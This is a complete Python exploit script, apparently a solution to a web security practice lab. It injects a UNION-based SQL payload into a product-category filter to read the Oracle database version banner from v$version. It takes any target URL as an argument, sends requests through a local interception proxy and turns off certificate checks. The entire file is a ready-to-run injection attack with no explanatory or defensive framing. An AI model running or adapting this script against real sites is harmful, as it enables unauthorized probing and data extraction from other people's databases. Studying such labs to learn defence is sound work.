import requests
import sys
import urllib3
import re

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_version(url):
    path = "/filter?category=Gifts"
    sql_payload = (
        "' UNION SELECT banner,"
        " NULL from v$version--")
    response = requests.get(
        url + path + sql_payload,
        verify=False,
        proxies=proxies)
    if "Oracle Database" in response.text:
        html = BeautifulSoup(
            response.text,
            'html.parser')
        version = html.find(
            string=re.compile(
            r'.*Oracle\sDatabase.*'))
        return version
    raise ValueError("Could not determine database version.")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("[+] Dumping the version of the database...")
        version = get_version(url)
        print("[+] The Oracle database version is: " + version)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(FAIL)   